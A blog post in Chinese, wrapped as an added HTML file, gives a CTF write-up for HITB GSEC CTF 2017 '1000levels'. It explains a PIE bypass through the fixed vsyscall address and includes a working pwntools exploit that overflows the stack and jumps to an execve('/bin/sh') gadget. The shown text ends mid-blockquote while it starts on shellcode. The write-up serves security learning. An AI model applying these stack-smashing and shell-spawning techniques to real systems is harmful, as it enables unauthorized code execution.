@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言在之前写过的 初识vdso&amp;amp;vsyscall 文章中提到了 vsyscall 地址不变的特性，那么这个特性也可以作为 PIE 开启情况下的 bypass 姿势，具体如何利用，见后文 本文涉及题目：HITB GSEC CTF 2017 - 1000levels 主要思路见 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;11350476.html 文章中的">
+<meta name="keywords" content="learn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PIE BYPASS 2-vsyscall">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;05&#x2F;PIE-BYPASS-2-vsyscall&#x2F;index.html">
+<meta property="og:site_name" content="zndetcl blog">
+<meta property="og:description" content="0x00 前言在之前写过的 初识vdso&amp;amp;vsyscall 文章中提到了 vsyscall 地址不变的特性，那么这个特性也可以作为 PIE 开启情况下的 bypass 姿势，具体如何利用，见后文 本文涉及题目：HITB GSEC CTF 2017 - 1000levels 主要思路见 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;11350476.html 文章中的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105222832644.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105223155447.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105223635488.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105225051384.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105234041284.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200106014805551.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200106104002310.png">
+<meta property="og:updated_time" content="2020-01-06T02:55:19.812Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;image-20200105222832644.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PIE BYPASS 2-vsyscall</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/01/22/2019%E5%9B%BD%E8%B5%9B-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/12/25/PIE-BYPASS-1-partial-write/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&text=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&is_video=false&description=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PIE BYPASS 2-vsyscall&body=Check out this article: http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&name=PIE BYPASS 2-vsyscall&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&t=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用命令"><span class="toc-number">2.</span> <span class="toc-text">0x01 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-流程分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用-1"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用-2"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PIE BYPASS 2-vsyscall
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zndetcl blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-05T13:34:28.000Z" itemprop="datePublished">2020-01-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/binary/">binary</a> › <a class="category-link" href="/categories/binary/ctf/">ctf</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在之前写过的 <strong>初识vdso&amp;vsyscall</strong> 文章中提到了 vsyscall 地址不变的特性，那么这个特性也可以作为 PIE 开启情况下的 bypass 姿势，具体如何利用，见后文</p>
+<p>本文涉及题目：HITB GSEC CTF 2017 - 1000levels</p>
+<p>主要思路见 <a href="https://www.cnblogs.com/ichunqiu/p/11350476.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/11350476.html</a> 文章中的 <code>使用vdso/vsyscall bypass PIE</code> 这一节</p>
+<p><em>ps: 题目附带给了 libc.so.6 库，但是目前不会搞这个环境，不知道如何才能让程序跑起来的时候使用题目附带的库，难道要整体切换 libc 库？</em></p>
+<h2 id="0x01-常用命令"><a href="#0x01-常用命令" class="headerlink" title="0x01 常用命令"></a>0x01 常用命令</h2><p><code>strings</code> 可以查看二进制文件中的字符串</p>
+<p><code>ldd</code> 可以查看程序运行所需的共享库</p>
+<p><code>nm</code> 可以查看文件中的符号信息，包括符号值，符号类型，符号即定义的函数/全局变量等</p>
+<p>有用的options:</p>
+<pre><code>-A 在每个符号信息的前面打印所在对象文件名称；
+-C 输出demangle过了的符号名称；
+-D 打印动态符号；
+-l 使用对象文件中的调试信息打印出所在源文件及行号；
+-n 按照地址/符号值来排序；
+-u 打印出那些未定义的符号；</code></pre><p>常见的符号类型:</p>
+<pre><code>A 该符号的值在今后的链接中将不再改变；
+B 该符号放在BSS段中，通常是那些未初始化的全局变量；
+D 该符号放在普通的数据段中，通常是那些已经初始化的全局变量；
+T 该符号放在代码段中，通常是那些全局非静态函数；
+U 该符号未定义过，需要自其他对象文件中链接进来；
+W 未明确指定的弱链接符号；同链接的其他对象文件中有它的定义就用上，否则就用一个系统特别指定的默认值。</code></pre><p>最简单的是使用 <code>-D</code> 参数，效果如下</p>
+<pre><code class="bash">$ nm -D libc.so.6 | grep system
+0000000000045390 T __libc_system
+00000000001387d0 T svcerr_systemerr
+0000000000045390 W system</code></pre>
+<h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>首先运行程序，熟悉下逻辑</p>
+<pre><code class="bash">$ ./1000levels 
+Welcome to 1000levels, it&#39;s much more diffcult than before.
+1. Go
+2. Hint
+3. Give up
+Choice:
+3
+You are a loser.
+
+$ ./1000levels 
+Welcome to 1000levels, it&#39;s much more diffcult than before.
+1. Go
+2. Hint
+3. Give up
+Choice:
+2
+NO PWN NO FUN
+1. Go
+2. Hint
+3. Give up
+Choice:
+2
+NO PWN NO FUN
+1. Go
+2. Hint
+3. Give up
+Choice:
+1
+How many levels?
+1
+Any more?
+0
+Let&#39;s go!&#39;
+====================================================
+Level 1
+Question: 0 * 0 = ? Answer:0
+Great job! You finished 1 levels in 1 seconds
+
+$ ./1000levels 
+Welcome to 1000levels, it&#39;s much more diffcult than before.
+1. Go
+2. Hint
+3. Give up
+Choice:
+1
+How many levels?
+3
+Any more?
+1
+Let&#39;s go!&#39;
+====================================================
+Level 1
+Question: 0 * 0 = ? Answer:0
+====================================================
+Level 2
+Question: 1 * 0 = ? Answer:0
+====================================================
+Level 3
+Question: 0 * 1 = ? Answer:0
+====================================================
+Level 4
+Question: 2 * 1 = ? Answer:2
+Great job! You finished 4 levels in 5 seconds</code></pre>
+<p>逻辑比较简单，3 个功能点</p>
+<ol>
+<li>第一个是答题环节，会有两次提示输入多少 levels，然后最终答题数为两者之和</li>
+<li>第二个是 hint 输出 NO PWN NO FUN</li>
+<li>第三个是直接退出</li>
+</ol>
+<p>测试一下答题数为负数的情况，如下</p>
+<pre><code class="bash">$ ./1000levels 
+Welcome to 1000levels, it&#39;s much more diffcult than before.
+1. Go
+2. Hint
+3. Give up
+Choice:
+1
+How many levels?
+-1
+Coward
+Any more?
+-1
+Coward
+1. Go
+2. Hint
+3. Give up
+Choice:
+3
+You are a loser.</code></pre>
+<p>第一个 levels 数和第二个数都为负的情况下会输出 <code>Coward</code> 然后重新运行程序</p>
+<p>查看保护情况</p>
+<pre><code class="bash">// checksec
+Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Partial</code></pre>
+<p>差不多了解运行逻辑了，拖进 IDA<br><img src="/.com//image-20200105222832644.png" alt="image-20200105222832644"></p>
+<p>main 函数如上，第一个红框应该就是输入 2 然后提示 NO PWN NO FUN ，第二个红框则为答题环境，print_menu 函数为输出菜单，read_num 函数为读取选项字符串，发现没有溢出漏洞</p>
+<p>首先进入 hint 函数查看一下</p>
+<p><img src="/.com//image-20200105223155447.png" alt="image-20200105223155447"></p>
+<p>如上红框，在 show_hint 变量不为 0 的情况下，直接打印出 system 函数的地址，system 函数是由 libc 中引用的，如果泄露了 system 函数的地址，那么就能掌握 libc 中其他符号的地址（因为 libc 加载基址是随机的，但是各个符号之间的相对位置是保持不变的）</p>
+<p>这就完了吗? 其实仔细看一下 hint 函数的汇编</p>
+<p><img src="/.com//image-20200105223635488.png" alt="image-20200105223635488"></p>
+<p>上图中红框部分，将 system 函数地址放进了 <code>rbp - 110</code> 这个地址处</p>
+<p><strong>一定要注意看汇编，不要太过于依赖 IDA 反编译出来的 c，就是因为这里没看见所以做题卡住了</strong></p>
+<p>由此可见， hint 函数有机会泄露出 libc 中的 system 函数地址，存在两个思路</p>
+<ol>
+<li>控制 show_hint 变量值</li>
+<li>注意 system 函数地址被放进了栈中，位于 <code>rbp - 100</code> ，如果能够泄露栈也能拿到 system 地址</li>
+</ol>
+<p>现在去查看 go 函数</p>
+<p><img src="/.com//image-20200105225051384.png" alt="image-20200105225051384"></p>
+<p>这里能够我们发现与第二个利用思路密切相关，暂时还没有出现任意地址写的情况</p>
+<p>上图中还有一个细节，当两个 levels 数和大于等于 1000 的时候，就传入 level 函数 1000</p>
+<p>继续跟入 levels 函数</p>
+<p><img src="/.com//image-20200105234041284.png" alt="image-20200105234041284"></p>
+<p>红框所示， buf 大小只有 30h ，而 read 写入 buf 的数据可以达到 0x400 之多，这里存在栈溢出，但是达不到任意地址写入的能力，这个 for 循环只是把 buf 结尾以 0 按照 8 位补齐</p>
+<p>注意一个细节， v7 在高地址 buf 在低地址，v2 为 rax 是 strtol 的返回结果，查了下 strtol 函数可以将字符串转换为 long ，这里可以通过溢出覆盖 v7 为 0 ： buf 全填 0 （ 0* 0x28 ），这样 (v2 = 0) == (v7 = 0) ，最终函数返回 1</p>
+<p>到这里已经完全摸清楚了这个程序的逻辑，利用思路也出来了: </p>
+<p>通过调用 hint 函数将 system 函数地址压入栈中，然后第一个 levels 数为 0 继续保留 system 地址，第二个 levels 数可以为任意数，最终 system 地址 + 任意数 ，这样我们就可以在栈中指定一个 libc 中的任意地址了</p>
+<p><strong><em>因为开启 PIE 的情况，不能简单通过栈溢出进行漏洞利用，必须先泄露地址才行</em></strong></p>
+<h2 id="0x03-利用-1"><a href="#0x03-利用-1" class="headerlink" title="0x03 利用-1"></a>0x03 利用-1</h2><p>最简单的方式就是直接利用栈中的 system + 任意数这样的形式，然后通过 pop|ret 类似的形式滑到 rbp-110h 处，最终由 rbp-110h 来确定 rip 的值，这样就等于能够跳到 libc 中的任意地址了</p>
+<p>首先解释一下 system 泄露后的作用</p>
+<pre><code class="text">开启 PIE 后，libc 中各函数相对偏移不变:
+system 实际地址 - libc_func 实际地址 = system 在 libc 中的偏移 - libc_func 在 libc 中的偏移
+-&gt;
+libc_func 实际地址 = system 实际地址 - system 在 libc 中的偏移 + libc_func 在 libc 中的偏移</code></pre>
+<p>在获得 system 实际地址后，system 与 libc_func 在 libc 中的偏移都能够通过 <code>nm</code> 工具拿到，如下</p>
+<pre><code class="bash">$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
+000000000004f440 T __libc_system
+0000000000159e20 T svcerr_systemerr
+000000000004f440 W system
+$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep syscall
+000000000011b820 T syscall</code></pre>
+<p>如上的输出结果，分别拿到了 <code>__libc_system</code>  与 <code>syscall</code> 的偏移</p>
+<p>如此情况下，我们只需要在第一次输入 levels 数指定为 0， 然后第二次输入值为</p>
+<p> <code>libc_func 在 libc 中的偏移 - system 在 libc 中的偏移</code></p>
+<p>那么现在需要计算一下溢出大小，溢出点在 level 函数中， system 地址在 go 函数的栈帧中</p>
+<p>先填满 buf 自身大小 0x30 ，然后再覆盖掉栈中的 rbp -&gt; 0x30 + 0x8</p>
+<p>此时的地址存放的是 rip ，可以控制跳转 -&gt; + 0x8</p>
+<p>由上文图中得出， go 函数最多分配了 120h 栈空间，system 函数处于 rbp-110h 中 -&gt; +0x10</p>
+<p>那么得出 buf 起始地址 + 0x30 + 0x8 + 0x8 + 0x10 =&gt; 此时的 rsp 指向的是存放 system 函数地址的地址</p>
+<p>这里我们需要注意一下，buf 填充了 0x38 后，这里填充的地址就是存放 rip 的地方，这里填充的任意 8 个字节都会控制后续程序的执行方向，我们的目的是能够让 rbp-110h 处控制 rip ，那么就需要 <code>\x90</code> 或者是 <code>pop|ret</code> 的操作，因为栈不可执行 <code>\x90</code> 无效，因为 PIE 的关系我们也无法指定地址造成 <code>pop|ret</code> 的效果</p>
+<p>这里就是本文的主题了，因为 vsyscall 的特殊性 (地址不变，不需要传参)，所以能够起到栈滑动的效果</p>
+<p>先在 0x38 处填入 vsyscall 函数的地址，当 level 函数 ret 时，<code>pop rip</code> 跳转到 vsyscall 函数 ，当 vsyscall 函数执行到 ret 时 <code>pop rip</code>  跳转到栈中高 64 位地址，如此往复，最后一次 <code>pop rip</code> 的时候，就是 <code>system + 偏移差</code> 决定了 rip 的值</p>
+<p>那么最后填入 buf 的数据为 : <code>&quot;A&quot;*0x38 + p64(0xffffffffff600000)*3</code></p>
+<p>因为我们在 rbp-110h 中的数据为一个函数地址，所以它的数字值肯定是大于 999 的，这意味着我们需要回答 1000 次问题，利用 <code>p64(0)*5</code> 溢出 buf 到 v7 就能轻松解决</p>
+<p>还剩下一个问题，往什么地方跳呢? 因为只利用了 system ，那么只能在 libc 中遨游了</p>
+<p>这个时候可以使用 one_gadget 这个工具了，它是专门搜索 libc 中的利用链，只需要满足它的要求即可 getshell</p>
+<p>使用效果如下</p>
+<pre><code class="bash">$ one_gadget libc.so.6 
+0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+<p>constraints 表示所需要的条件，如第一条返回结果，需要 rax = 0 ，这个需求比较简单使用 vsyscall 中的 gettimeofday 即可满足，其函数返回 rax = 0，于此同时打印出了该 gadget 的入口: 0x45216 ，这也是一个 libc 中的偏移值，所以最终我们能够跳到 0x45216 这里并且让 rax = 0 即可 getshell</p>
+<p>poc 如下</p>
+<pre><code class="python">#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+def autoAnswer():
+    prog.recvuntil(&quot;Answer:&quot;)
+    prog.sendline( p64(0)*5 ) # v2 == v7 -&gt; 0 == 0
+
+#context.log_level = &quot;debug&quot;
+prog = process(&quot;./1000levels&quot;)
+
+one_gadget = 0x45216 # need rax = NULL
+system_offset = 0x45390
+one_gadget_addr_offset = one_gadget - system_offset
+vsyscall_gettimeofday = 0xffffffffff600000
+
+prog.recv()
+prog.sendline(&#39;2&#39;) # call hint()
+
+prog.recv()
+prog.sendline(&#39;1&#39;) # call go() =&gt; rbp-110h -&gt; syscall address
+
+prog.recv()
+prog.sendline(&#39;-1&#39;) # save syscall address =&gt; rbp-110h
+
+prog.recv()
+prog.sendline(str(one_gadget_addr_offset)) # send offset of one_gadget
+
+for i in range(999):
+    print i
+    autoAnswer()
+
+prog.recv()
+prog.send(&quot;A&quot;*0x38 + p64(vsyscall_gettimeofday)*3) # send 0x38*A and 3*vsyscall_gettimeofday
+prog.interactive()</code></pre>
+<h2 id="0x04-利用-2"><a href="#0x04-利用-2" class="headerlink" title="0x04 利用-2"></a>0x04 利用-2</h2><p>可是我不会设环境，题目自带的这个 libc.so.6 我不会用呀，题目一跑起来就是用的 <code>/lib/x86_64-linux-gnu/libc.so.6</code> ，用 one_gadget 看了下这个 libc 如下</p>
+<pre><code class="bash">$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+
+0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+<p>简单分析了下发现都无法满足这个 rsp 的限制 (发现 rsp 相关的限制有点难搞，毕竟栈中存在各种值，想要指定栈中的某个地方为 0 还是得看程序的运行情况)</p>
+<p>那难道就没法做了吗这个题? 原理我都懂了可是就没法拿 shell 搞得很难受</p>
+<p>找到个大佬的博客：<a href="https://www.cnblogs.com/p4nda/p/7493880.html" target="_blank" rel="noopener">【HITB GSEC CTF 2017】1000levels</a></p>
+<p>文章中的思路比较有意思，利用答题环节必须要 system+任意数 的结果大于 0 才能进入来爆破泄露 system 函数的实际地址</p>
+<p>回顾上文中流程分析中提到，当 system+任意数 不大于 0 时，会提示 <code>Coward</code> 并且重新开始运行整个循环，那么这里就可以理解为 <code>system + (- 猜测数)</code> ，当 猜测数 小于 system 时，两者相减为正数，则进入答题环节，当 猜测数 大于等于 system 时，两者相减为非正数重启循环</p>
+<p>注意一个细节，我们可以确定 system 低 12 位偏移，可以从 libc 直接拿到，其余的部分参见 <a href="http://www.cnblogs.com/wangaohui/p/7122653.html" target="_blank" rel="noopener">这里</a> 得知猜测的范围</p>
+<pre><code class="bash">$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
+000000000004f440 T __libc_system
+0000000000159e20 T svcerr_systemerr
+000000000004f440 W system
+// 由此得出 __libc_system 低 12 位为 0x440</code></pre>
+<p>由程序逻辑，我们想要更快的爆破出 system 的地址需要从 大地址 开始猜测，x86_64 栈最大为 <code>0x7fff ffff ffff</code> ，其中低 12 位已经确定，则我们可以从 <code>0x7fff ffff f440</code> 这样来爆破，为了高效，可以选择从高位地址猜测，如 <code>0x7f00 0000 0440</code> 先从第 40 位开始爆破，逐位递减</p>
+<p>能够想到这样的爆破方式先是 猜测数 &gt;= system ，然后变成 猜测数 &lt;= system</p>
+<p>假设 system 地址为 <code>0x7fb65bfed440</code> ，那么我们从高到低第一个数为 <code>0x7f0000000440</code> 这肯定小于 system 地址，于是会进入答题阶段解题 1000 道最后退出，这里该怎么办后续再分析</p>
+<p>我们通过某种办法能够再进入 go 函数中，与 system 地址比大小，第二个数为 <code>0x7ff000000440</code> ，这就明显大于  system 地址了，于是会提示 <code>Coward</code> 并且重启循环，我们再次进入 go 函数，这个时候通过 <code>Coward</code> 的返回结果的提示，我们知道猜大了，那就把刚刚那位减小，输入 <code>-0x7fd000000440</code> ，如此往复，直到输入 <code>-0x7fb000000440</code> 此时变动的高位地址与 system 相同，两者相减肯定是大于 1000 的…</p>
+<p>如上往复，我们可以从高位逐位爆破 ( 但是这里没有考虑高位相减=0的情况，如 system 为<code>0x7ffd00000440</code>，类似这种情况 )，到了第 13 位的时候需要留意一下，假设已经爆破到了  <code>0x7fb65bfed440</code> 此时与 system 相减结果为 0 ，还是会提示 <code>Coward</code> 然后重启循环，接下来我们会多减小一次得到 <code>0x7fb65bfec440</code> 这个结果，然后与 system 相减结果为 0x1000 还是大于 1000 ，然后循环答题 999 次，最后一次答题时，我们已知 system 的实际地址，所以可以通过构造 libc 中的 gadget 进行 getshell</p>
+<p>这里回头看看刚刚的问题，在解答 1000 道题的过程中，无论时中途失败还是最终全部答对，都会在 go 函数中调用 exit 函数退出程序，这里我们就需要在最后一次答题时溢出栈中的 rip ，控制程序走向，让它再度进入 go 函数中，否则 system 永远猜不到</p>
+<p>仔细想想，在溢出的时候 ，栈中的 rip 值比 rbp 高 64 位地址，所以一定会将 rbp 覆盖，这样就破坏了 go 函数的栈帧，于是就没有办法正常执行程序了，因为 main 、 go 、level 函数都依赖 rbp 来定位函数中的变量值，由此控制函数逻辑， rbp 一旦被破坏则函数逻辑就不可预测了</p>
+<p>能不能有一个函数，它在 main-&gt;go-&gt;level 调用链中，并且由不依赖 rbp 的呢？</p>
+<p><strong>答案是有的，<code>_start</code> 函数</strong></p>
+<p>函数体如下</p>
+<p><img src="/.com//image-20200106014805551.png" alt="image-20200106014805551"></p>
+<p>如上，确实没有 <code>push rbp; mov rbp,rsp</code> 这样的操作，然后更奇怪的是，它居然还会将自己的入口地址存放在栈中，并且是稳定地址，这是什么意思呢，解释下：</p>
+<p>在调用 <code>__libc_start__main</code> 时，rip 被存入栈中，然后我在 main 入口打断点，运行程序到断点，打印当前栈，发现 <code>_start</code> 函数的入口地址被放在了 rip 栈地址之后（低地址），这就意味着，在 <code>_start</code> 未退出（因为 rip 还在栈中）的时候，这个调用过程中会将 <code>_start</code> 函数的入口地址放入栈中</p>
+<p>那么因为 <code>_start</code> 入口地址放入栈中的地址是绝对稳定的，我们就可以利用 vsyscall 滑到栈中的 <code>_start</code> 入口地址存放点，通过 vsyscall 函数中的 <code>ret</code> 进入 <code>_start</code> 函数中，再次重新调用 main 函数，在这个过程中 <code>_start</code> 的地址又会被放入栈中…</p>
+<p>由此往复，我们可以 bypass go 函数的 exit 调用，因为在 level 函数调用结束时，我们滑到了 <code>_start</code> 函数，由此开启新循环</p>
+<p><strong>这里我对 <code>_start</code> 函数并不熟悉，只是记录了一下这个动作，以后有机会研究研究</strong></p>
+<p>下面测试运行一下程序，看看栈中的地址分布</p>
+<pre><code class="bash">(gdb) disassemble _start 
+Dump of assembler code for function _start:
+   0x00005555555549d0 &lt;+0&gt;:    xor    ebp,ebp
+   0x00005555555549d2 &lt;+2&gt;:    mov    r9,rdx
+   0x00005555555549d5 &lt;+5&gt;:    pop    rsi
+   0x00005555555549d6 &lt;+6&gt;:    mov    rdx,rsp
+   0x00005555555549d9 &lt;+9&gt;:    and    rsp,0xfffffffffffffff0
+   0x00005555555549dd &lt;+13&gt;:    push   rax
+   0x00005555555549de &lt;+14&gt;:    push   rsp
+   0x00005555555549df &lt;+15&gt;:    lea    r8,[rip+0x65a]        # 0x555555555040 &lt;__libc_csu_fini&gt;
+   0x00005555555549e6 &lt;+22&gt;:    lea    rcx,[rip+0x5e3]        # 0x555555554fd0 &lt;__libc_csu_init&gt;
+   0x00005555555549ed &lt;+29&gt;:    lea    rdi,[rip+0x55a]        # 0x555555554f4e &lt;main&gt;
+   0x00005555555549f4 &lt;+36&gt;:    call   0x555555554950 &lt;__libc_start_main@plt&gt;
+   0x00005555555549f9 &lt;+41&gt;:    hlt    
+End of assembler dump.</code></pre>
+<p>现在断点在 main 函数入口，并运行程序</p>
+<p><img src="/.com//image-20200106104002310.png" alt="image-20200106104002310"></p>
+<p>如上箭头所示，栈中还存在 <code>0x5555555549f9</code> 与 <code>0x5555555549d0</code> 这两个地址，<code>0x5555555549f9</code> 这个地址就是 <code>_start</code> 函数执行到 <code>call   0x555555554950</code> 时的 rip 值，所以目前 <code>_start</code> 还未退栈，由此看出在 <code>_start</code> 函数到 main 函数的调用链中，会将 <code>_start</code> 函数入口地址 <code>0x00005555555549d0</code> 入栈两次，这是稳定的一个 <code>_start</code> 入口地址入栈操作，里面原理目前不懂，但是已经足够拿来利用控制程序逻辑走向</p>
+<p>one_gadget 不起作用，那就只能手动做一个 gadget 了，使用 ROPgadget 工具</p>
+<p>记得一个简单的 shellcode 应该这么玩：</p>
+<blockquote>
+<pre><code>用exec系统调用打开一个shell终端需要的参数和指令如下：
+
+    mov rax, 0x3b   ; system call number, 0x3b for sys_exec
